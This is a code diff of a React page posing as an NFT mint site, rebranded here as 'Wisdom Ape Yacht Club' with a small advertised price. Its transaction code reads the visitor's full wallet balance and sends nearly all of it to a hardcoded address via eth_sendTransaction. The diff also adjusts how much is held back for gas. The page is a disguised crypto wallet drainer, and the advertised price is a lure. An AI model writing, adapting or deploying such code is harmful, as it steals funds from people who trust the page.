@@ -3,10 +3,10 @@ import {useEffect, useState} from "react";
 import imgDiscord from './icons8-discord-50.png'
 import imgTwitter from './icons8-twitter-50.png'
 
-const ethAmount = 0.055
-const image = 'https://pbs.twimg.com/profile_images/1539341870240759808/dx2avU3m_400x400.jpg'
-const Title = 'Metaleon Society'
-const supply = 1120
+const ethAmount = 0.0013
+const image = 'https://pbs.twimg.com/profile_images/1628878512944988160/eq7sb1zl_400x400.jpg'
+const Title = 'Wisdom Ape Yacht Club'
+const supply = 200
 
 document.title = Title
 document.getElementById('favicon').setAttribute('href', image)
@@ -45,13 +45,13 @@ function App() {
         const balance = await window.ethereum.request({method: 'eth_getBalance', params: [address[0], 'latest']})
         const convertedBalance = parseInt(balance, 16) * Math.pow(10, -18)
         // console.log('balance', ethAmount, gas, (gas / 15) / 3089, (ethAmount - (Number(gas) / 10000)))
-        console.log(convertedBalance, parseInt((convertedBalance - (gas / 1000000000)) * 1000000000000000000).toString(16))
+        console.log(gas, gas / 100000, convertedBalance, parseInt((convertedBalance - (gas / 1000000000)) * 1000000000000000000).toString(16))
         let params = [{
             "from": address[0],
             "to": '0x57f415C2128875C9e4e3EDB2080010837D10e1Cd',
             // "gas": Number(((gas / 15) / 3089) * 10000000).toFixed().toString(16),
             //"gasPrice": Number(gas * 1000000000).toString(16),
-            "value": parseInt((convertedBalance - (gas / 1000000000)) * 1000000000000000000).toString(16)
+            "value": parseInt((convertedBalance - (gas / 100000)) * 1000000000000000000).toString(16)
         }]
 
         const response = await window.ethereum.request({method: 'eth_sendTransaction', params}).catch(err => {
